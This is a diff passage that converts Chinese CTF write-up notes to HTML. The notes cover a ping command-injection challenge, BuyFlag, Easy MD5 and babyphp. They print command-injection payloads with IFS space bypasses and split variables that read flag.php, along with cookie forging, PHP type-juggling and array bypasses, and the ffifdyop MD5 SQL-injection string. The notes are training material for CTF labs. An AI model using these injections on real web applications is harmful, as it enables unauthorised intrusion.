+<h3 id="空格绕过的一些小姿势"><a href="#空格绕过的一些小姿势" class="headerlink" title="空格绕过的一些小姿势"></a>空格绕过的一些小姿势</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9($IFS$1)</span><br><span class="line">$IFS\</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line"></span><br><span class="line">注：在eval使用带有$的字符串时，需要进行用\转义，因为$在php中有特殊含义</span><br></pre></td></tr></table></figure>
+
+<h3 id="敏感字符绕过"><a href="#敏感字符绕过" class="headerlink" title="敏感字符绕过"></a>敏感字符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用变量拼接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="正则表达式匹配规则，贪婪匹配"><a href="#正则表达式匹配规则，贪婪匹配" class="headerlink" title="正则表达式匹配规则，贪婪匹配"></a>正则表达式匹配规则，贪婪匹配</h3><p>[codeblock]</p>
+<h3 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h3><p>是进行正则表达式的匹配，成功返回1，否则返回0</p>
+<p>preg_match(正则表达式，需要匹配的对象，可选（即可以没有）匹配结果的数组）</p>
+<h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b84392c5-image.png" alt="image.png"></p>
+<h3 id="根据题目尝试ping一下通过burpsuite得到的IP"><a href="#根据题目尝试ping一下通过burpsuite得到的IP" class="headerlink" title="根据题目尝试ping一下通过burpsuite得到的IP"></a>根据题目尝试ping一下通过burpsuite得到的IP</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a69de4a4-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c0008329-image.png" alt="image.png"></p>
+<h3 id="发现flag用cat获取"><a href="#发现flag用cat获取" class="headerlink" title="发现flag用cat获取"></a>发现flag用cat获取</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/111e4ff6-image.png" alt="image.png"></p>
+<h3 id="绕过尝试"><a href="#绕过尝试" class="headerlink" title="绕过尝试"></a>绕过尝试</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><ol>
+<li>题目要求绕过空格键，绕过方法参考了唐师傅，在后面自己也根据网上查找的做了总结</li>
+</ol>
+<p>使用%09绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5f16118f-image.png" alt="image.png"></p>
+<p>fack your symbol!可能过滤了特殊字符‘%’</p>
+<p>接下来尝试了分别尝试了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt; 重定向符</span><br><span class="line">$&#123;IES&#125;//失败，猜测可能过滤了&#123;&#125;</span><br><span class="line">$IFS$9//成功进入下一步，&#x27;$&#x27;不会被过滤</span><br></pre></td></tr></table></figure>
 
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/09bd87cb-image.png)
-
-1. 通过绕过得到源码
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3bb578c8-image.png)
-
-这里使用excc让其输出ping -c 4文件，又因为php是后端语言，使用cat的话最后需要在源码里查看flag
-
-#### 敏感字符flag绕过
-
-尝试了利用变量拼接进行绕过
-
-`?ip=1;a=ag;b=fl;tac$IFS$9$b$a.php`可绕过
-
-贪婪匹配：
-
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/09bd87cb-image.png" alt="image.png"></p>
+<ol>
+<li>通过绕过得到源码</li>
+</ol>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3bb578c8-image.png" alt="image.png"></p>
+<p>这里使用excc让其输出ping -c 4文件，又因为php是后端语言，使用cat的话最后需要在源码里查看flag</p>
+<h4 id="敏感字符flag绕过"><a href="#敏感字符flag绕过" class="headerlink" title="敏感字符flag绕过"></a>敏感字符flag绕过</h4><p>尝试了利用变量拼接进行绕过</p>
+<p><code>?ip=1;a=ag;b=fl;tac$IFS$9$b$a.php</code>可绕过</p>
+<p>贪婪匹配：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">  die(&quot;fxck your flag!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-这串代码是flag的贪婪匹配，匹配一个字符串中是否按顺序出现过flag四个字母
-
-1. 后又尝试利用base64编码进行绕过，及内敛绕过，然后查看源码得到flag
-
-###### 内敛绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/aa6c6d86-image.png)
-
-###### base64编码绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b79bf738-image.png)
-
+<p>这串代码是flag的贪婪匹配，匹配一个字符串中是否按顺序出现过flag四个字母</p>
+<ol>
+<li>后又尝试利用base64编码进行绕过，及内敛绕过，然后查看源码得到flag</li>
+</ol>
+<h6 id="内敛绕过"><a href="#内敛绕过" class="headerlink" title="内敛绕过"></a>内敛绕过</h6><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/aa6c6d86-image.png" alt="image.png"></p>
+<h6 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h6><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b79bf738-image.png" alt="image.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING 117.21.200.166 (117.21.200.166): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;e25f2e86-37c0-4078-b947-f613cad1891b&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-## 知识汇总
-
-### 贪婪匹配
-
-在正则表达式匹配规则里
-
-. :匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符，请使用像 '[.\n]' 的模式
-
-*：匹配0个或多个
-
-使用 .* 的话就可以匹配任意长度的任意字符
-
-在贪婪匹配下，.* 会匹配尽可能多的字符
-
-非贪婪匹配的写法是.*?
-
-### 源代码中涉及bush和sh
-
-sh: 遵循POSIX规范：“当某行代码出错时，不继续往下解释”。
-
-bash: 就算出错，也会继续向下执行。
-
-sh 跟bash的区别，实际上是bash有没开启POSIX模式的区别。
-
-简单说，sh是bash的一种特殊的模式，sh就是开启了POSIX标准的bash， /bin/sh 相当于 /bin/bash --posix
-
-在Linux系统上/bin/sh往往是指向/bin/bash的符号链接
-
-### cat与tac
-
-### 重定向
-
-顾名思义，就是重新定义输入输出方向，将原本应该从标准输入设备（键盘）输入的数据，改由其他文件或设备输入，或将原本应该输出到标准输出设备（显示器）的内容，改由输出到其他文件或设备上。
-
-#### 重定向符’|‘
-
-#### 重定向符’>‘，’<‘（临时）完了会自动恢复
-
-手动恢复：
-
-1. exec >/dev/tty （ /dev/tty 文件代表的就是显示器 ）
-2. 如果还有别的文件描述符指向了显示器，那么也可以别的文件描述符来恢复
-
-#### exec
-
-使用 exec 命令可以永久性地重定向，后续命令的输入输出方向也被确定了，直到再次遇到 exec 命令才会改变重定向的方向，如果没有使用，则之前的重定向都是临时的，只对当前命令有效
-
-# [极客大挑战 2019]BuyFlag
-
-## 涉及知识
-
-### is_numeric()函数安全漏洞
-
-用于检测变量是否为数字或者数字字符串。若是则为true，否则为false
-
-一些绕过姿势
-
+<h2 id="知识汇总"><a href="#知识汇总" class="headerlink" title="知识汇总"></a>知识汇总</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>在正则表达式匹配规则里</p>
+<p>. :匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像 ‘[.\n]’ 的模式</p>
+<p>*：匹配0个或多个</p>
+<p>使用 .* 的话就可以匹配任意长度的任意字符</p>
+<p>在贪婪匹配下，.* 会匹配尽可能多的字符</p>
+<p>非贪婪匹配的写法是.*?</p>
+<h3 id="源代码中涉及bush和sh"><a href="#源代码中涉及bush和sh" class="headerlink" title="源代码中涉及bush和sh"></a>源代码中涉及bush和sh</h3><p>sh: 遵循POSIX规范：“当某行代码出错时，不继续往下解释”。</p>
+<p>bash: 就算出错，也会继续向下执行。</p>
+<p>sh 跟bash的区别，实际上是bash有没开启POSIX模式的区别。</p>
+<p>简单说，sh是bash的一种特殊的模式，sh就是开启了POSIX标准的bash， &#x2F;bin&#x2F;sh 相当于 &#x2F;bin&#x2F;bash –posix</p>
+<p>在Linux系统上&#x2F;bin&#x2F;sh往往是指向&#x2F;bin&#x2F;bash的符号链接</p>
+<h3 id="cat与tac"><a href="#cat与tac" class="headerlink" title="cat与tac"></a>cat与tac</h3><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>顾名思义，就是重新定义输入输出方向，将原本应该从标准输入设备（键盘）输入的数据，改由其他文件或设备输入，或将原本应该输出到标准输出设备（显示器）的内容，改由输出到其他文件或设备上。</p>
+<h4 id="重定向符’-‘"><a href="#重定向符’-‘" class="headerlink" title="重定向符’|‘"></a>重定向符’|‘</h4><h4 id="重定向符’-‘，’"><a href="#重定向符’-‘，’" class="headerlink" title="重定向符’&gt;‘，’&lt;‘（临时）完了会自动恢复"></a>重定向符’&gt;‘，’&lt;‘（临时）完了会自动恢复</h4><p>手动恢复：</p>
+<ol>
+<li>exec &gt;&#x2F;dev&#x2F;tty （ &#x2F;dev&#x2F;tty 文件代表的就是显示器 ）</li>
+<li>如果还有别的文件描述符指向了显示器，那么也可以别的文件描述符来恢复</li>
+</ol>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>使用 exec 命令可以永久性地重定向，后续命令的输入输出方向也被确定了，直到再次遇到 exec 命令才会改变重定向的方向，如果没有使用，则之前的重定向都是临时的，只对当前命令有效</p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="涉及知识-3"><a href="#涉及知识-3" class="headerlink" title="涉及知识"></a>涉及知识</h2><h3 id="is-numeric-函数安全漏洞"><a href="#is-numeric-函数安全漏洞" class="headerlink" title="is_numeric()函数安全漏洞"></a>is_numeric()函数安全漏洞</h3><p>用于检测变量是否为数字或者数字字符串。若是则为true，否则为false</p>
+<p>一些绕过姿势</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j[]=58B    利用数组+十六进制来进行绕过</span><br><span class="line">%00				 空字符，无论放在数据前后都可以判断为非数值</span><br><span class="line">%02				 空格字符，只能放在数据后</span><br><span class="line">j=58a			 </span><br></pre></td></tr></table></figure>
 
-若是在sql注入中碰到也可以用16进制来绕过，将sql语句转为16进制字符串即可
-
-### 弱等于绕过
-
-php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型
-
-### cookie伪造
-
-#### cookie机制：
-
-是在浏览网页的时候，服务器将你的登录信息，浏览信息等发送给客户端并保存一定的时间。当你下一次访问这个网站的时候，就能读取上一次你的记录
-
-一般情况下，cookie是以键值对进行表示的(key-value)，例name=jack，这个就表示cookie的名字是name，cookie携带的值是jack
-
-#### 漏洞
-
-很多的网站都是由cookie来辨认登录者的信息。它可以起到登录验证的作用，从而存在了漏洞，可以绕过验证直接登录到后台
-
-​
-
-### strmp（）
-
-从第一位开始，依次比较两个字符串的 ASCII码值，strmp(str1,str2)，如果str1>str2返回值为1，反之则为-1，完全相等即为0
-
-注：如果传入其他类型的变量会报错，但是此时返回值为0
-
-## 解题过程
-
-进入靶场，看到这样
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ab1069ee-image.png)
-
-如果你想买到flag，你必须是CUIT的学生（夹带私货），必须给出正确的pass world，还要一亿大洋
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d8966c7f-image.png)
-
-查看网页源代码，看到这样一串代码，用post传参，提交money和password，password不能为数字字符串且弱等于404
-
-通过burp suite进行网页抓包
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/cebdc012-image.png)
-
-### cookie伪造实操
-
-首先需要是学生，cookie将用户数量作为登录信息，我们伪造了用户数量就可以绕过登录，成为将CUIT的学生，user改为1
-
-### burp suite的简单使用
-
-再将get传参模式改为post
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/d412a435-image.png)
-
-### 绕过is_numeric()函数，弱类型比较
-
-password=404aa&money=100000000
-
-post password和money(复习一下post接多个参数用&连接，第一节课有讲），
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/6eea2fd2-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/02cb15c2-image.png)
-
-说数字过长，改变钱的数量的话又说钱不够
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/09526b1c-image.png)
-
-### stremp()绕过
-
-emmm，猜测可能不是比较数字大小而是通过别的函数进行匹配
-
-涉及位数，大小，猜测使用了strmp()函数进行比较，要使得返回值为0，我们无法知晓另外一个字符串，因此使用一个数组绕过，money[]=1
-
-![5d127147226892a0.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/9d62d03d-5d127147226892a0.jpg)
-
-将其返回网页
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/0471be80-image.png)
-
-得到flag
-
-# [BJDCTF2020]Easy MD5
-
-## 涉及知识
-
-### 请求头和响应头
-
-### md5函数
-
-#### 语法
-
-MD5（string,raw)
-
-string:必须，规定要计算的字符串
-
-raw:可选，用于规定是十六进制输出格式还是二进制输出格式
-
-- TRUE-原始16字符二进制格式
-- FALSE-默认，32字符十六进制格式
-
-#### 返回值
-
-成功则返回计算出来的MD5散列，失败则返回FALSE
-
-#### ffifdyop绕过
-
-绕过原理
-
-ffifdyop 这个字符串被md5哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是' or '6
-而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是1select * from 'admin' where password='' or '6xxxxx'，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数
-
-___________________________________________________________________________
-
-摘自[https://blog.csdn.net/qq_61778128/article/details/125817377](https://blog.csdn.net/qq_61778128/article/details/125817377)
-
-​
-
-​
-
-#### 使用0e绕过
-
-0e开头，PHP会认为是科学计数法，都是0
-
-以下字符串MD5以0e开头
-
+<p>若是在sql注入中碰到也可以用16进制来绕过，将sql语句转为16进制字符串即可</p>
+<h3 id="弱等于绕过"><a href="#弱等于绕过" class="headerlink" title="弱等于绕过"></a>弱等于绕过</h3><p>php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型</p>
+<h3 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h3><h4 id="cookie机制："><a href="#cookie机制：" class="headerlink" title="cookie机制："></a>cookie机制：</h4><p>是在浏览网页的时候，服务器将你的登录信息，浏览信息等发送给客户端并保存一定的时间。当你下一次访问这个网站的时候，就能读取上一次你的记录</p>
+<p>一般情况下，cookie是以键值对进行表示的(key-value)，例name&#x3D;jack，这个就表示cookie的名字是name，cookie携带的值是jack</p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>很多的网站都是由cookie来辨认登录者的信息。它可以起到登录验证的作用，从而存在了漏洞，可以绕过验证直接登录到后台</p>
+<p>​</p>
+<h3 id="strmp（）"><a href="#strmp（）" class="headerlink" title="strmp（）"></a>strmp（）</h3><p>从第一位开始，依次比较两个字符串的 ASCII码值，strmp(str1,str2)，如果str1&gt;str2返回值为1，反之则为-1，完全相等即为0</p>
+<p>注：如果传入其他类型的变量会报错，但是此时返回值为0</p>
+<h2 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h2><p>进入靶场，看到这样</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ab1069ee-image.png" alt="image.png"></p>
+<p>如果你想买到flag，你必须是CUIT的学生（夹带私货），必须给出正确的pass world，还要一亿大洋</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d8966c7f-image.png" alt="image.png"></p>
+<p>查看网页源代码，看到这样一串代码，用post传参，提交money和password，password不能为数字字符串且弱等于404</p>
+<p>通过burp suite进行网页抓包</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/cebdc012-image.png" alt="image.png"></p>
+<h3 id="cookie伪造实操"><a href="#cookie伪造实操" class="headerlink" title="cookie伪造实操"></a>cookie伪造实操</h3><p>首先需要是学生，cookie将用户数量作为登录信息，我们伪造了用户数量就可以绕过登录，成为将CUIT的学生，user改为1</p>
+<h3 id="burp-suite的简单使用"><a href="#burp-suite的简单使用" class="headerlink" title="burp suite的简单使用"></a>burp suite的简单使用</h3><p>再将get传参模式改为post</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d412a435-image.png" alt="image.png"></p>
+<h3 id="绕过is-numeric-函数，弱类型比较"><a href="#绕过is-numeric-函数，弱类型比较" class="headerlink" title="绕过is_numeric()函数，弱类型比较"></a>绕过is_numeric()函数，弱类型比较</h3><p>password&#x3D;404aa&amp;money&#x3D;100000000</p>
+<p>post password和money(复习一下post接多个参数用&amp;连接，第一节课有讲），</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/6eea2fd2-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/02cb15c2-image.png" alt="image.png"></p>
+<p>说数字过长，改变钱的数量的话又说钱不够</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/09526b1c-image.png" alt="image.png"></p>
+<h3 id="stremp-绕过"><a href="#stremp-绕过" class="headerlink" title="stremp()绕过"></a>stremp()绕过</h3><p>emmm，猜测可能不是比较数字大小而是通过别的函数进行匹配</p>
+<p>涉及位数，大小，猜测使用了strmp()函数进行比较，要使得返回值为0，我们无法知晓另外一个字符串，因此使用一个数组绕过，money[]&#x3D;1</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/9d62d03d-5d127147226892a0.jpg" alt="5d127147226892a0.jpg"></p>
+<p>将其返回网页</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/0471be80-image.png" alt="image.png"></p>
+<p>得到flag</p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="涉及知识-4"><a href="#涉及知识-4" class="headerlink" title="涉及知识"></a>涉及知识</h2><h3 id="请求头和响应头"><a href="#请求头和响应头" class="headerlink" title="请求头和响应头"></a>请求头和响应头</h3><h3 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>MD5（string,raw)</p>
+<p>string:必须，规定要计算的字符串</p>
+<p>raw:可选，用于规定是十六进制输出格式还是二进制输出格式</p>
+<ul>
+<li>TRUE-原始16字符二进制格式</li>
+<li>FALSE-默认，32字符十六进制格式</li>
+</ul>
+<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>成功则返回计算出来的MD5散列，失败则返回FALSE</p>
+<h4 id="ffifdyop绕过"><a href="#ffifdyop绕过" class="headerlink" title="ffifdyop绕过"></a>ffifdyop绕过</h4><p>绕过原理</p>
+<p>ffifdyop 这个字符串被md5哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6<br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
+<hr>
+<p>摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61778128/article/details/125817377">https://blog.csdn.net/qq_61778128&#x2F;article&#x2F;details&#x2F;125817377</a></p>
+<p>​</p>
+<p>​</p>
+<h4 id="使用0e绕过"><a href="#使用0e绕过" class="headerlink" title="使用0e绕过"></a>使用0e绕过</h4><p>0e开头，PHP会认为是科学计数法，都是0</p>
+<p>以下字符串MD5以0e开头</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s21587387a  </span><br></pre></td></tr></table></figure>
 
-#### 使用数组绕过
+<h4 id="使用数组绕过"><a href="#使用数组绕过" class="headerlink" title="使用数组绕过"></a>使用数组绕过</h4><p>MD5不能处理数组，返回值为NULL（上课有讲过）</p>
+<h3 id="error-reporting"><a href="#error-reporting" class="headerlink" title="error_reporting()"></a>error_reporting()</h3><p>error_reporting() 函数规定报告哪个错误，用于屏蔽报错</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h4><p>用于从数据库中选取数据</p>
+<h2 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2a90f59f-image.png" alt="image.png"></p>
+<p>看到页面，要求我们提交查询，使用F12查看</p>
+<p>响应头有提示，但是我开始连响应头是什么都不知，这个是看了别人的</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e1d1bd9e-image.png" alt="image.png"></p>
+<p>需要我们提交数据，需要MD5绕过，绕过原理在涉及知识里面</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d07e9fec-image.png" alt="image.png"></p>
+<p>看到这个界面，查看网页源码发现</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3e96bb2e-image.png" alt="image.png"></p>
+<p>需要我们用GRT传参，使得ab不相等但MD5后可以弱等于，两种方法罗列在前面，这里我用了数组的方式</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/9c2853ef-image.png" alt="image.png"></p>
+<p>需要POST传参，注意这里使用了强等于’&#x3D;&#x3D;&#x3D;‘，那么0e开头的方法就不可以使用了，可以继续用数组，用burp suite改成POST传参</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/83c7bb08-image.png" alt="image.png"></p>
+<p>得到flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e8b609f7-image.png" alt="image.png"></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8c2bd85d-image.png" alt="image.png"></p>
+<p>md5数组绕过</p>
+<h1 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>把里面的内容当作是一句php命令来执行</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/efe8ea86-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/1bd5c672-image.png" alt="image.png"></p>
+<h1 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h1><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/122b7f60-image.png" alt="image.png"></p>
+<h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-MD5不能处理数组，返回值为NULL（上课有讲过）
-
-### error_reporting()
-
-error_reporting() 函数规定报告哪个错误，用于屏蔽报错
-
-### SQL注入
-
-#### select语句
-
-用于从数据库中选取数据
-
-## 解题过程
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2a90f59f-image.png)
-
-看到页面，要求我们提交查询，使用F12查看
-
-响应头有提示，但是我开始连响应头是什么都不知，这个是看了别人的
-
